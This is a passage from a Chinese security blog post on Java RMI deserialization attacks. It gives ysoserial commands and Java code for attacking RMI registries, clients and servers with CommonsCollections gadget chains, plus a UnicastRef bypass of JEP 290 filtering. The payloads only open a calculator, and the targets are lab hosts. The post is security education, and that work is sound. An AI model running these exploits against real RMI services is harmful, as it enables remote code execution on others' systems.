+        <span class="n">Operation</span><span class="o">[]</span> <span class="n">operations</span> <span class="o">=</span> <span class="o">(</span><span class="n">Operation</span><span class="o">[])</span> <span class="n">fields_1</span><span class="o">[</span><span class="n">0</span><span class="o">].</span><span class="na">get</span><span class="o">(</span><span class="n">registry_remote</span><span class="o">);</span>
+
+        <span class="c1">// 跟lookup方法一样的传值过程
+</span><span class="c1"></span>        <span class="n">RemoteCall</span> <span class="n">var2</span> <span class="o">=</span> <span class="n">ref</span><span class="o">.</span><span class="na">newCall</span><span class="o">((</span><span class="n">RemoteObject</span><span class="o">)</span> <span class="n">registry_remote</span><span class="o">,</span> <span class="n">operations</span><span class="o">,</span> <span class="n">2</span><span class="o">,</span> <span class="n">4905912898345647071L</span><span class="o">);</span>
+        <span class="n">ObjectOutput</span> <span class="n">var3</span> <span class="o">=</span> <span class="n">var2</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">();</span>
+        <span class="n">var3</span><span class="o">.</span><span class="na">writeObject</span><span class="o">(</span><span class="n">proxyEvalObject</span><span class="o">);</span>
+        <span class="n">ref</span><span class="o">.</span><span class="na">invoke</span><span class="o">(</span><span class="n">var2</span><span class="o">);</span>
+
+        <span class="n">registry_remote</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">&#34;HelloRegistry&#34;</span><span class="o">);</span>
+        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;rmi start at 3333&#34;</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+<li>
+<p>方法二 <strong>（受JEP 290影响）</strong></p>
+<p>利用ysoserial JRMPClient模块攻击注册中心，通过与DGC通信的方式发送恶意对象让注册中心反序列化</p>
+<p><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPClient 127.0.0.1 1099 CommonsCollections2 &quot;open /System/Applications/Calculator.app&quot;</code></p>
+</li>
+<li>
+<p>方法三</p>
+<p>参考JEP 290的绕过部分。</p>
+</li>
+</ol>
+<h3 id="服务端攻击注册中心"><a href="#服务端攻击注册中心" class="anchor-link">#</a><a href="#contents:服务端攻击注册中心" class="headings">服务端攻击注册中心</a></h3>
+<p>正常情况下，服务端通过bind函数向注册中心绑定userhello对象并通过序列化方式传输给注册中心。但如果把这里userhello对象替换为cc1链构造出的InvocationHandler对象，注册中心端会对该对象进行反序列化。</p>
+<p>触发点在<code>sun.rmi.registry.RegistryImpl_Skel#dispatch</code>下的readObject()函数。</p>
+<p><strong>利用方法 （受JEP 290影响）</strong></p>
+<ol>
+<li>
+<p>ysoserial中的<code>RMIRegistryExploit</code>模块<code>java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit 192.168.31.138 1099 CommonsCollections1 &quot;open /System/Applications/Calculator.app&quot;</code></p>
+</li>
+<li>
+<p>代码测试</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="n">1099</span><span class="o">);</span>
+<span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">&#34;hello&#34;</span><span class="o">,</span> <span class="k">new</span> <span class="n">userhello</span><span class="o">());</span> <span class="c1">//userhello为恶意类，注册中心会进行反序列化。
+</span><span class="c1">//rebind也可以
+</span></code></pre></td></tr></table></div>
+</div>
+</div></li>
+</ol>
+<p>默认情况下，服务端向注册端进行bind等操作会验证服务端地址是否被允许（默认只信任localhost）。但不是信任地址也可以利用。因为注册端对于服务端的验证在反序列化操作之后。在8u141之后，JDK代码对于此处验证逻辑变成先验证再反序列化，此时就不能绕过地址校验了。</p>
+<h3 id="注册中心攻击客户端或服务端"><a href="#注册中心攻击客户端或服务端" class="anchor-link">#</a><a href="#contents:注册中心攻击客户端或服务端" class="headings">注册中心攻击客户端(或服务端)</a></h3>
+<p>借助ysoserial启动一个JRMP注册中心</p>
+<p><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections2 &quot;open /System/Applications/Calculator.app&quot;</code></p>
+<p><strong>利用原理（不受JEP 290影响）</strong></p>
+<p>客户端代码</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="s">&#34;192.168.31.158&#34;</span><span class="o">,</span><span class="n">1099</span><span class="o">);</span>
+<span class="n">user</span> <span class="n">hello</span> <span class="o">=</span> <span class="o">(</span><span class="n">user</span><span class="o">)</span> <span class="n">registry</span><span class="o">.</span><span class="na">lookup</span><span class="o">(</span><span class="s">&#34;hello&#34;</span><span class="o">);</span>
+<span class="cm">/*
+</span><span class="cm">list() 除了list()之外，其余的操作都可以进行利用
+</span><span class="cm">bind()
+</span><span class="cm">rebind()
+</span><span class="cm">unbind()
+</span><span class="cm">lookup()
+</span><span class="cm">*/</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>同理，由自定义的注册中心返回恶意的序列化对象，客户端收到后会对其进行反序列化。这里如果存在cc2链利用环境则利用成功。</p>
+<p>触发点在<code>sun.rmi.registry.RegistryImpl_Stub#lookup</code>下的readObject()函数。</p>
+<h2 id="jep290-绕过"><a href="#jep290-绕过" class="anchor-link">#</a><a href="#contents:jep290-绕过" class="headings"><strong>JEP290</strong> 绕过</a></h2>
+<p>在<code>JDK6u141、JDK7u131、JDK 8u121</code>开始加入了JEP 290限制。JEP 290是来限制能够被反序列化的类，主要包含以下几个机制：</p>
+<ol>
+<li>提供一个限制反序列化类的机制，白名单或者黑名单。</li>
+<li>限制反序列化的深度和复杂度。</li>
+<li>为RMI远程调用对象提供了一个验证类的机制。</li>
+<li>定义一个可配置的过滤机制，比如可以通过配置properties文件的形式来定义过滤器。</li>
+</ol>
+<p><strong>Tips:</strong></p>
+<ol>
+<li>如果是Client端和Server端互相攻击默认是没有过滤的。JEP290需要手动设置，没有设置的话就还是可以正常进行反序列化利用。</li>
+<li>JEP 290默认分别为<strong>RMI注册端</strong>和**RMI分布式垃圾收集器（DGC）**提供了内置过滤器（通过setObjectInputFilter来设置Filter进行类的过滤）。这两个过滤器都配置为白名单，只允许反序列化特定类。</li>
+</ol>
+<p>在有JEP 290的JDK版本进行攻击会报以下错误：</p>
+<p><code>ObjectInputFilter REJECTED: class sun.reflect.annotation.AnnotationInvocationHandler......</code></p>
+<h3 id="unicastref-bypass-jep290"><a href="#unicastref-bypass-jep290" class="anchor-link">#</a><a href="#contents:unicastref-bypass-jep290" class="headings">UnicastRef Bypass JEP290</a></h3>
+<p>可以利用UnicastRef.class这个白名单类新建一个RMI连接请求来绕过JEP290的限制。</p>
+<p>RMI框架采用DGC(Distributed Garbage Collection)分布式垃圾收集机制来管理远程对象的生命周期。</p>
+<p><img src="/images/1635065494.png" alt=""></p>
+<p><strong>利用原理</strong></p>
+<p>通过UnicastRef对象建立一个JRMP连接，JRMPListener端将序列化传给注册中心反序列化的过程中没有setObjectInputFilter，传给注册中心的恶意对象会被反序列化进而攻击成功。</p>
+<p>触发点在<code>sun.rmi.transport.DGCImpl_Skel#dispatch</code>下的readObject()函数</p>
+<p><strong>利用方式</strong></p>
+<ul>
+<li>
+<p>代码（对应上图）</p>
+<p>ysoserial 启动一个恶意的JRMPListener。</p>
+<p><code>java -cp ysoserial-master-8eb5cbfbf6-1.jar ysoserial.exploit.JRMPListener 3333 CommonsCollections5 &quot;calc.exe&quot;</code></p>
+<p>注册中心</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span><span class="o">{</span>
+    <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="n">2222</span><span class="o">);</span>
+    <span class="n">User</span> <span class="n">user</span> <span class="o">=</span> <span class="k">new</span> <span class="n">UserImpl</span><span class="o">();</span>
+    <span class="n">registry</span><span class="o">.</span><span class="na">rebind</span><span class="o">(</span><span class="s">&#34;HelloRegistry&#34;</span><span class="o">,</span> <span class="n">user</span><span class="o">);</span>
+    <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;rmi start at 2222&#34;</span><span class="o">);</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div><p>Server端 （这段代码是ysoserial payload中JRMPClient类的部分）</p>
+<div class="highlight"><div class="chroma">
+<div class="table-container"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">RemoteException</span><span class="o">,</span> <span class="n">IllegalAccessException</span><span class="o">,</span> <span class="n">InvocationTargetException</span><span class="o">,</span> <span class="n">InstantiationException</span><span class="o">,</span> <span class="n">ClassNotFoundException</span><span class="o">,</span> <span class="n">NoSuchMethodException</span><span class="o">,</span> <span class="n">AlreadyBoundException</span> <span class="o">{</span>
+    <span class="n">Registry</span> <span class="n">reg</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">(</span><span class="s">&#34;localhost&#34;</span><span class="o">,</span><span class="n">1099</span><span class="o">);</span> <span class="c1">// rmi start at 2222
+</span><span class="c1"></span>    <span class="n">ObjID</span> <span class="n">id</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjID</span><span class="o">(</span><span class="k">new</span> <span class="n">Random</span><span class="o">().</span><span class="na">nextInt</span><span class="o">());</span>
+    <span class="n">TCPEndpoint</span> <span class="n">te</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TCPEndpoint</span><span class="o">(</span><span class="s">&#34;127.0.0.1&#34;</span><span class="o">,</span> <span class="n">3333</span><span class="o">);</span> <span class="c1">// JRMPListener&#39;s port is 3333
+</span><span class="c1"></span>    <span class="n">UnicastRef</span> <span class="n">ref</span> <span class="o">=</span> <span class="k">new</span> <span class="n">UnicastRef</span><span class="o">(</span><span class="k">new</span> <span class="n">LiveRef</span><span class="o">(</span><span class="n">id</span><span class="o">,</span> <span class="n">te</span><span class="o">,</span> <span class="kc">false</span><span class="o">));</span>
+    <span class="n">RemoteObjectInvocationHandler</span> <span class="n">obj</span> <span class="o">=</span> <span class="k">new</span> <span class="n">RemoteObjectInvocationHandler</span><span class="o">(</span><span class="n">ref</span><span class="o">);</span>
+    <span class="n">Registry</span> <span class="n">proxy</span> <span class="o">=</span> <span class="o">(</span><span class="n">Registry</span><span class="o">)</span> <span class="n">Proxy</span><span class="o">.</span><span class="na">newProxyInstance</span><span class="o">(</span><span class="n">client</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">getClassLoader</span><span class="o">(),</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span> <span class="o">{</span>
+            <span class="n">Registry</span><span class="o">.</span><span class="na">class</span>
+    <span class="o">},</span> <span class="n">obj</span><span class="o">);</span>
+    <span class="k">try</span> <span class="o">{</span>
+        <span class="n">reg</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">&#34;Hello&#34;</span><span class="o">,</span><span class="n">proxy</span><span class="o">);</span>
+    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">AlreadyBoundException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+        <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></td></tr></table></div>
+</div>
+</div></li>
+</ul>
+<p>或直接使用<a href="https://github.com/wh1t3p1g/ysomap" target="_blank" rel="noopener">ysomap</a>中的RMIRegistryExploit模块（也是利用的代码中的方式<strong>JDK ≤ 8u231</strong>可以利用）。</p>
+<ol>
+<li>
+<p>先用ysoserial启动RMI registry，等待目标连接</p>
+<p><code>java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections2 &quot;open -a calculator.app&quot;</code></p>
+</li>
+<li>
+<p>ysomap中指定目标RMI registry的地址和端口，并在bullet模块中指定ysoserial启动的RMI registry地址。run之后便可看到目标弹出计算器。</p>
+</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="anchor-link">#</a><a href="#contents:参考" class="headings">参考</a></h2>
+<ol>
+<li><a href="https://xz.aliyun.com/t/7930#toc-2" target="_blank" rel="noopener">针对RMI服务的九重攻击 - 上 - 先知社区</a></li>
+<li><a href="https://xz.aliyun.com/t/7932#toc-5" target="_blank" rel="noopener">针对RMI服务的九重攻击 - 下 - 先知社区</a></li>
+<li><a href="https://xz.aliyun.com/t/8706#toc-5" target="_blank" rel="noopener">RMI 过程源码分析</a></li>
+<li><a href="https://paper.seebug.org/1194/#java-rmi" target="_blank" rel="noopener">JAVA RMI 反序列化知识详解</a></li>
+<li><a href="https://www.geekby.site/2021/08/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-3/" target="_blank" rel="noopener">Java反序列化漏洞系列-3</a></li>
+<li><a href="https://www.cnblogs.com/nice0e3/p/13927460.html" target="_blank" rel="noopener">Java安全之RMI反序列化</a></li>
+</ol>
+
+            </div>
+
+            
+    
+    
+        <ul class="post-copyright">
+            <li class="copyright-item author"><span class="copyright-item-text">作者</span>：<a href="https://myzxcg.com/" class="p-author h-card" target="_blank" rel="noopener">myzxcg</a></li>
+            
+                
+                
+                
+                
+                <li class="copyright-item link"><span class="copyright-item-text">链接</span>：<a href="/2021/10/Java-RMI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">https://myzxcg.com/2021/10/Java-RMI分析与利用/</a></li>
+            
+            <li class="copyright-item license"><span class="copyright-item-text">许可</span>：<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a></li>
+            
+        </ul>
+    
+
+
+
+        </article>
+
+        
+
+        
+
+
+        
+
+
+        
+
+
+        
+    
+    
+        <div class="related-posts">
+            <h2 class="related-title">相关文章：<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon related-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm144 276c0 6.6-5.4 12-12 12h-92v92c0 6.6-5.4 12-12 12h-56c-6.6 0-12-5.4-12-12v-92h-92c-6.6 0-12-5.4-12-12v-56c0-6.6 5.4-12 12-12h92v-92c0-6.6 5.4-12 12-12h56c6.6 0 12 5.4 12 12v92h92c6.6 0 12 5.4 12 12v56z"/></svg></h2>
+            <ul class="related-list">
+                
+                    <li class="related-item">
+                        <a href="/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" class="related-link">Spring 内存马实现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/11/Weblogic-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E4%B8%8E%E5%AE%9E%E7%8E%B0/" class="related-link">Weblogic 内存马分析与实现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/11/Shiro-%E5%9B%9E%E6%98%BE%E4%B8%8E%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/" class="related-link">Shiro 回显与内存马实现</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/10/Tomcat-%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90%E5%8F%8A%E6%A3%80%E6%B5%8B/" class="related-link">Tomcat 内存马分析及检测</a>
+                    </li>
+                
+                    <li class="related-item">
+                        <a href="/2021/10/Tomcat-%E6%9E%B6%E6%9E%84%E4%B8%8EContext%E5%88%86%E6%9E%90/" class="related-link">Tomcat 架构与Context分析</a>
+                    </li>
+                
+            </ul>
+        </div>
+    
+
+
+
+        
+
+
+        
+    <footer class="minimal-footer">
+        
+            <div class="post-tag"><a href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag" class="post-tag-link">#java安全</a></div>
+        
+        
+        
+            
+        
+    </footer>
+
+
+
+        
+
+
+        
+    
+        
+        
+    
+    
+    
+    
+        <ul class="post-nav">
+            
+                <li class="post-nav-prev">
+                    <a href="/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/" rel="prev">&lt; Java JNDI分析与利用</a>
+                </li>
+            
+            
+                <li class="post-nav-next">
+                    <a href="/2021/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" rel="next">Java反序列化基础 &gt;</a>
+                </li>
+            
+        </ul>
+    
+
+
+
+        
+    
+
+        
+            <div class="load-comments">
+                <div id="load-comments">加载评论</div>
+            </div>
+        
+
+        
+
+        
+            <div id="vcomments"></div>
+        
+
+        
+
+        
+    
+
+
+
+    </div>
+</main>
+
+
+            
+    <div id="back-to-top" class="back-to-top">
+        <a href="#"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon arrow-up"><path d="M34.9 289.5l-22.2-22.2c-9.4-9.4-9.4-24.6 0-33.9L207 39c9.4-9.4 24.6-9.4 33.9 0l194.3 194.3c9.4 9.4 9.4 24.6 0 33.9L413 289.4c-9.5 9.5-25 9.3-34.3-.4L264 168.6V456c0 13.3-10.7 24-24 24h-32c-13.3 0-24-10.7-24-24V168.6L69.2 289.1c-9.3 9.8-24.8 10-34.3.4z"/></svg></a>
+    </div>
+
+
+            
+    <footer id="footer" class="footer">
+        <div class="footer-inner">
+            
+
+            
+    
+        <ul class="socials"><li class="socials-item">
+                    <a href="https://github.com/myzxcg" target="_blank" rel="external noopener" title="GitHub"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="https://twitter.com/myzxcg" target="_blank" rel="external noopener" title="Twitter"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="mailto:myz.xcg@gmail.com" target="_blank" rel="external noopener" title="Email"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon social-icon"><path d="M464 64H48C21.49 64 0 85.49 0 112v288c0 26.51 21.49 48 48 48h416c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm0 48v40.805c-22.422 18.259-58.168 46.651-134.587 106.49-16.841 13.247-50.201 45.072-73.413 44.701-23.208.375-56.579-31.459-73.413-44.701C106.18 199.465 70.425 171.067 48 152.805V112h416zM48 400V214.398c22.914 18.251 55.409 43.862 104.938 82.646 21.857 17.205 60.134 55.186 103.062 54.955 42.717.231 80.509-37.199 103.053-54.947 49.528-38.783 82.032-64.401 104.947-82.653V400H48z"/></svg></a>
+                </li><li class="socials-item">
+                    <a href="/rss.xml" target="_blank" rel="external noopener" title="RSS"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="icon social-icon"><path d="M19.199 24C19.199 13.467 10.533 4.8 0 4.8V0c13.165 0 24 10.835 24 24h-4.801zM3.291 17.415c1.814 0 3.293 1.479 3.293 3.295 0 1.813-1.485 3.29-3.301 3.29C1.47 24 0 22.526 0 20.71s1.475-3.294 3.291-3.295zM15.909 24h-4.665c0-6.169-5.075-11.245-11.244-11.245V8.09c8.727 0 15.909 7.184 15.909 15.91z"/></svg></a>
+                </li></ul>
+    
+
+
+            <div class="site-info">©&nbsp;2021&nbsp;myzxcg&nbsp;| Powered by <a href="https://github.com/reuixiy/hugo-theme-meme" target="_blank" rel="noopener">MemE</a>
+              </div>
+
+            
+        </div>
+    </footer>
+
+
+        </div>
+        
+
+        
+
+
+
+
+
+
+    
+
+        
+
+        
+            <script>
+    function loadComments() {
+        if (typeof Valine === 'undefined') {
+            var getScript = (options) => {
+                var script = document.createElement('script');
+                script.defer = true;
+                script.crossOrigin = 'anonymous';
+                Object.keys(options).forEach((key) => {
+                    script[key] = options[key];
+                });
+                document.body.appendChild(script);
+            };
+            getScript({
+                src: '//unpkg.com/valine@latest/dist/Valine.min.js',
+                onload: () => {
+                    newValine();
+                }
+            });
+        } else {
+            newValine();
+        }
+    }
+    function newValine() {
+        new Valine({
+            el: '#vcomments',
+            appId: '6Fu9AJHglaqmAVjpYMdOOBEi-MdYXbMMI',
+            appKey: '0GcKEskKSnNfqn5dbNITfO4H',
+            placeholder: '有问题欢迎交流',
+            path: location.pathname,
+            avatar: 'mp',
+            meta: ["nick","mail","link"],
+            pageSize:  10 ,
+            lang: 'zh-cn',
+            visitor:  false ,
+            highlight:  true ,
+            avatarForce:  false ,
+            recordIP:  true ,
+            serverURLs: '',
+            emojiCDN: '',
+            emojiMaps: {},
+            enableQQ:  false ,
+            requiredFields: []
+        });
+    }
+</script>
+
+        
+
+        
+
+        
+
+    
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/medium-zoom@latest/dist/medium-zoom.min.js"></script>
+
+<script>
+    let imgNodes = document.querySelectorAll('div.post-body img');
+    imgNodes = Array.from(imgNodes).filter(node => node.parentNode.tagName !== "A");
+
+    mediumZoom(imgNodes, {
+        background: 'hsla(var(--color-bg-h), var(--color-bg-s), var(--color-bg-l), 0.95)'
+    })
+</script>
+
+
+
+
+    <script src="https://cdn.jsdelivr.net/npm/instant.page@5.1.0/instantpage.min.js" type="module" defer></script>
+
+
+
+
+
+
+
+    </body>
+</html>
